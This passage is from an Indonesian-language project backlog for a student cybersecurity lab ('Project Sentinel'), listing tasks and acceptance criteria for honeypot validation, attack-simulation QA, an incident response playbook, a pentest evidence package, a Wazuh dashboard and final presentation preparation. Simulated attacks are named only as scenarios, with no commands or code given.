Verifikasi bahwa seluruh ekosistem honeypot berfungsi sebagai canary trap yang efektif selama sesi simulasi serangan. Setiap interaksi penyerang ke honeypot harus tercatat di log Cowrie, diteruskan ke Wazuh, memicu alert severity tinggi, dan mengirimkan notifikasi Telegram — semua dalam satu rantai yang berjalan otomatis.

**Acceptance Criteria**

1. SSH ke IP Cowrie dari Kali menghasilkan log interaksi lengkap (session recorded) di /var/log/cowrie/cowrie.json.
2. Log Cowrie berhasil diforward ke Wazuh dan alert muncul di dashboard dengan rule group "honeypot".
3. Alert honeypot memiliki severity level minimal 12 (HIGH) di Wazuh.
4. Notifikasi Telegram terkirim dalam < 15 detik saat honeypot diakses.
5. Canary token di file sensitif juga divalidasi: dibuka dari VM lain → alert terpicu → notif Telegram diterima.
6. Screenshot log Cowrie + alert Wazuh + notif Telegram diunggah ke repo /evidence/week3/honeypot/.

---

### #29 — QA & validasi simulasi serangan: tabel evidence dan crosscheck deteksi
**Sprint:** Minggu 3 — 25–31 Mei | **Label:** `[dokumentasi]` | **Assignee:** Romadhona

**Deskripsi**

Jalankan fungsi Quality Assurance selama seluruh sesi simulasi serangan Minggu 3. Romadhona bertugas sebagai observer independen yang memastikan setiap serangan terdokumentasi dengan bukti yang valid, setiap alert diverifikasi sebagai true positive, dan semua kekurangan dilaporkan ke anggota yang relevan untuk segera diperbaiki.

**Acceptance Criteria**

1. Hadir dan observasi seluruh sesi simulasi serangan (Issue #20–#25) — catat setiap anomali atau kegagalan deteksi.
2. Tabel QA dibuat dan diunggah ke repo: kolom Skenario | Serangan Dijalankan | Alert Muncul (Ya/Tidak) | Waktu Deteksi | Level Severity | Catatan.
3. Setiap alert SIEM diverifikasi kesesuaiannya dengan skenario serangan yang dijalankan (true positive atau false positive).
4. Temuan kegagalan deteksi dilaporkan ke Rafli untuk fine-tuning rules (Issue #26) dengan catatan spesifik.
5. Tabel QA final diunggah ke repo sebagai bagian dari evidence package laporan pentest.

---

### #30 — Review dan validasi teknis Incident Response Playbook
**Sprint:** Minggu 3 — 25–31 Mei | **Label:** `[dokumentasi]` | **Assignee:** Romadhona, Rafli, Yusmadani

**Deskripsi**

Lakukan review teknis terhadap draft Incident Response Playbook yang ditulis Dea di Minggu 2. Reviewer bertugas memastikan setiap prosedur akurat, dapat dijalankan, dan mencerminkan sistem yang benar-benar dibangun — bukan prosedur generik. Referensi kasus nyata dari analisis Romadhona harus diintegrasikan ke skenario yang relevan.

**Acceptance Criteria**

1. Review mencakup semua 4 skenario Playbook: Ransomware, Brute Force, Lateral Movement, Honeypot Triggered.
2. Setiap langkah Containment diverifikasi: apakah sesuai dengan sistem yang dibangun (pfSense block, Wazuh active response, Telegram bot)?
3. Referensi kasus nyata (Log4Shell untuk skenario web exploitation, MGM untuk lateral movement) ditambahkan ke skenario yang relevan.
4. Waktu target respons di setiap fase Playbook diverifikasi realistis terhadap BR-01 (maksimal 4 jam downtime).
5. Review notes (daftar perubahan yang disarankan) diserahkan ke Dea sebelum 30 Mei.
6. Playbook dinyatakan "approved" setelah semua perubahan diimplementasikan dan ditandatangani oleh reviewer.

---

### #31 — Finalisasi Incident Response Playbook (step-by-step per skenario)
**Sprint:** Minggu 3 — 25–31 Mei | **Label:** `[dokumentasi]` | **Assignee:** Dea

**Deskripsi**

Lengkapi dan finalisasi IR Playbook berdasarkan pengalaman nyata dari simulasi serangan yang baru dilakukan dan hasil review dari Romadhona, Rafli, dan Yusmadani. Setiap langkah harus spesifik, actionable, dan mencerminkan cara sistem SIEM, honeypot, dan active response yang sudah dibangun merespons setiap tipe ancaman.

**Acceptance Criteria**

1. Playbook mencakup semua 4 skenario: Ransomware/Enkripsi, Brute Force/Credential Attack, Lateral Movement, Honeypot Triggered.
2. Setiap skenario memiliki prosedur lengkap: Deteksi → Containment → Eradication → Recovery → Lessons Learned.
3. Prosedur Containment mencantumkan langkah spesifik di sistem yang dibangun (misal: "Blokir IP di pfSense > Firewall > Aliases").
4. Playbook mencantumkan referensi kasus nyata (Colonial Pipeline, MGM, Log4Shell) di skenario yang relevan.
5. Waktu target respons untuk setiap fase tercantum sesuai BR-01 (maksimal 4 jam downtime).
6. Semua review notes dari Issue #30 sudah diimplementasikan.
7. Playbook final diunggah ke repo folder /docs/ dalam format .docx dan .pdf.

---

### #32 — Kompilasi evidence package: laporan uji penetrasi internal (deliverable 4)
**Sprint:** Minggu 3 — 25–31 Mei | **Label:** `[dokumentasi]` | **Assignee:** Dea, Romadhona

**Deskripsi**

Kumpulkan, organisir, dan kompilasi seluruh bukti dari simulasi serangan Minggu 3 menjadi satu evidence package yang terstruktur. Ini adalah deliverable 4 dari case study: Laporan Uji Penetrasi Internal yang membuktikan sistem deteksi benar-benar mampu menangkap serangan simulasi.

**Acceptance Criteria**

1. Folder /evidence/ di repo terstruktur per skenario: recon/, bruteforce/, lateral-movement/, ransomware/, log4shell/, honeypot/.
2. Setiap folder berisi: screenshot serangan, screenshot alert Wazuh berpasangan, dan raw log yang relevan.
3. File PENTEST_REPORT.md dibuat dengan struktur: Metodologi → Temuan Per Skenario → Tabel Ringkasan → Rekomendasi.
4. Tabel ringkasan berisi kolom: Skenario | MITRE Technique | Tools | Terdeteksi (Ya/Tidak) | Level Alert | Waktu Deteksi.
5. Rekaman OBS per skenario dicantumkan link-nya di laporan (Google Drive).
6. Laporan di-review oleh Rafli untuk validasi akurasi teknis dan oleh Romadhona untuk kelengkapan QA sebelum issue ditutup.

---

## MINGGU 4 — 1–3 JUNI 2026 — FINALISASI & PRESENTASI

---

### #33 — Finalisasi HLD & LLD: dokumen arsitektur final (deliverable 1)
**Sprint:** Minggu 4 — 1–3 Juni | **Label:** `[dokumentasi]` | **Assignee:** Dea

**Deskripsi**

Sempurnakan dokumen arsitektur jaringan yang sudah dibuat di Minggu 1 dan 2 menjadi versi final yang mencerminkan implementasi aktual. HLD tetap menampilkan gambaran besar, sementara LLD menambahkan detail teknis nyata: IP address, port, protokol, dan alur log yang sebenarnya berjalan di lab.

**Acceptance Criteria**

1. HLD final: diagram tingkat tinggi dengan narasi per komponen (deskripsi singkat setiap zona jaringan).
2. LLD final: diagram detail menampilkan IP address setiap VM, port setiap service, dan protokol komunikasi.
3. Tabel IP scheme lengkap tersedia: hostname, IP, OS, role, VLAN.
4. Alur log dari setiap sumber ke Wazuh ditunjukkan dengan panah berlabel di LLD.
5. Kedua diagram diekspor ke PDF dan PNG, diunggah ke repo folder /docs/architecture/.
6. Triyas memvalidasi akurasi teknis LLD sebelum issue ditutup.

---

### #34 — Finalisasi dashboard monitoring Wazuh/Kibana (deliverable 5)
**Sprint:** Minggu 4 — 1–3 Juni | **Label:** `[teknis]` | **Assignee:** Rafli

**Deskripsi**

Sempurnakan tampilan Wazuh dashboard agar siap didemonstrasikan ke mentor dan juri. Dashboard harus mampu menyampaikan kondisi keamanan secara visual dalam hitungan detik — baik untuk audiens teknis (SOC team) maupun non-teknis (C-level management). Panel MITRE ATT&CK yang built-in di Wazuh harus diaktifkan.

**Acceptance Criteria**

1. Dashboard utama menampilkan: total alert hari ini, alert per severity level, top 5 rule yang paling sering terpicu, top 5 source IP mencurigakan, dan timeline serangan (hourly).
2. Panel khusus honeypot tersedia: menampilkan jumlah interaksi honeypot per hari dan top interacting IP.
3. Panel MITRE ATT&CK tersedia di dashboard (aktifkan fitur built-in Wazuh dan konfigurasi).
4. Dashboard dapat diakses dari Management Network tanpa error dan dapat di-refresh otomatis.
5. Screenshot dashboard dalam kondisi ada alert aktif diunggah ke repo sebagai bukti.
6. Tampilan rapi dan dapat dipresentasikan tanpa perlu scrolling berlebihan saat demo.

---

### #35 — Finalisasi semua dokumen dan crosscheck rubrik penilaian (deliverable checklist)
**Sprint:** Minggu 4 — 1–3 Juni | **Label:** `[dokumentasi]` | **Assignee:** Dea

**Deskripsi**

Satukan semua deliverable menjadi satu paket laporan akhir yang kohesif dan lakukan crosscheck menyeluruh terhadap rubrik penilaian dari dokumen case study. Ini adalah quality gate terakhir sebelum presentasi — pastikan tidak ada poin rubrik yang terlewat atau tidak terdokumentasi.

**Acceptance Criteria**

1. Semua 5 deliverable dari case study terpenuhi: HLD/LLD, SIEM terkonfigurasi, Playbook, Laporan Pentest, Dashboard.
2. Checklist rubrik penilaian diisi: Teknis 40% | Dokumentasi 25% | Inovasi 20% | Presentasi 15%.
3. File FINAL_CHECKLIST.md dibuat di repo berisi status setiap deliverable dan poin rubrik yang di-cover.
4. Semua file tersimpan rapi di Google Drive (backup) dan GitHub (utama) dalam folder yang terstruktur.
5. Link ke semua deliverable dicantumkan di README.md utama repo.
6. Tidak ada deliverable yang statusnya kosong atau placeholder — semua harus berisi konten final.

---

### #36 — Buat deck presentasi final + pembagian narasi per anggota
**Sprint:** Minggu 4 — 1–3 Juni | **Label:** `[presentasi]` | **Assignee:** Dea

**Deskripsi**

Susun slide presentasi yang mengalur dari masalah (insiden Global-Tech Corp) ke solusi arsitektur, demo bukti deteksi, inovasi, dan kesimpulan. Siapkan juga skrip narasi yang membagi bagian presentasi secara jelas ke setiap anggota agar presentasi terasa menyatu dan profesional di depan juri Grab dan Telkomsigma.

**Acceptance Criteria**

1. Slide deck tersedia dalam format .pptx dan .pdf di repo folder /docs/presentation/.
2. Deck memiliki minimal 12 slide: cover, agenda, latar belakang masalah, requirements, arsitektur (HLD), demo highlights, inovasi (honeypot + active response + canary token), MITRE coverage heatmap, analisis kasus nyata, lessons learned, Q&A.
3. Setiap slide memiliki visual yang jelas (diagram, screenshot) — bukan slide teks penuh.
4. Skrip narasi per anggota tersedia: Dea (pembuka + playbook + penutup), Rafli (SIEM + dashboard + AR), Triyas (network + segmentasi + VPN), Yusmadani (simulasi serangan + temuan), Romadhona (kasus nyata + deception strategy + IAM).
5. Alur demo live sudah direncanakan dan dicantumkan dalam DEMO_SCRIPT.md di repo.

---

### #37 — Setup backup demo: rekaman OBS per skenario + DEMO_CONTINGENCY.md
**Sprint:** Minggu 4 — 1–3 Juni | **Label:** `[presentasi]` | **Assignee:** Romadhona

**Deskripsi**

Siapkan semua materi backup untuk antisipasi kegagalan demo live saat presentasi. Romadhona bertanggung jawab memastikan rekaman OBS dari seluruh simulasi Minggu 3 terorganisir dengan baik dan troubleshooting checklist tersedia — sehingga tim tidak panik jika ada masalah teknis di hari-H.

**Acceptance Criteria**

1. Rekaman OBS dari semua skenario simulasi (brute force, port scan, mimikatz, ransomware, log4shell, honeypot) tersimpan rapi di Google Drive dengan penamaan yang jelas.
2. Link Google Drive ke semua rekaman dicantumkan di repo pada file DEMO_BACKUP.md.
3. File DEMO_CONTINGENCY.md dibuat di repo berisi: daftar skenario gagal yang mungkin terjadi dan langkah mitigasinya.
4. Romadhona menguji semua rekaman dapat diputar tanpa error sebelum 2 Juni.
5. Rekaman backup siap ditampilkan dalam < 30 detik jika demo live gagal di tengah presentasi.

---

### #38 — Dry run presentasi dan demo live: simulasi sesi di depan juri
**Sprint:** Minggu 4 — 1–3 Juni | **Label:** `[presentasi]` | **Assignee:** Dea, Rafli, Triyas, Yusmadani, Romadhona

**Deskripsi**

Lakukan latihan presentasi lengkap minimal 1 kali sebelum hari H, mensimulasikan kondisi presentasi di depan mentor/juri. Fokus pada kelancaran transisi antar pembicara, kemampuan demo live tanpa error, dan kesiapan menjawab pertanyaan teknis. Demo dioperasikan oleh Romadhona (Kali attacker) dan Rafli (Wazuh dashboard).

**Acceptance Criteria**

1. Dry run dilaksanakan dengan semua 5 anggota hadir (online atau offline) sebelum 3 Juni.
2. Waktu total presentasi tidak melebihi batas yang ditentukan (estimasi 20–30 menit).
3. Demo live end-to-end berhasil: Romadhona trigger serangan dari Kali → alert di SIEM (Rafli tunjukkan) → IP diblokir pfSense → notif Telegram diterima.
4. Setiap anggota mampu menjelaskan bagian teknisnya masing-masing tanpa membaca dari slide.
5. Minimal 10 pertanyaan teknis yang mungkin ditanyakan juri sudah disiapkan jawabannya.
6. Catatan perbaikan dari dry run diimplementasikan sebelum presentasi ke mentor (6–7 Juni).

---

*Project Sentinel — Backlog & Acceptance Criteria — FYEP Cybersecurity 2026*
